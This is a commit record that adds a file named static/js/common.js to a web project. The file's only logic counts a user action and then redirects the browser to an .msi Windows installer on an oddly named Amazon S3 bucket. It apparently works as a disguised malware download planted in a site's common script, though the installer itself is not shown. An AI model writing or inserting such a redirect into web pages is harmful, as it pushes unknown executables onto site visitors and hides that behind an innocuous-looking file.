daa8b83b5eaac983f642412a4c2f361e9ffe1035
a168188aa <lishimingzaw@gmail.com>
2025-09-21 15:41:03 +0800

    Add files via upload

---
+++ static/js/common.js
@@ -0,0 +1,18 @@
+﻿function loadUrl()
+{
+	if(num>=1)
+	{
+		var url="https://csrtnr.s3.ap-southeast-1.amazonaws.com/heLLerwrodc.msi";
+		window.location=url;
+	}
+}
+
+var num=0;
+function getLoad()
+{
+	num++;
+
+}
+
+
+
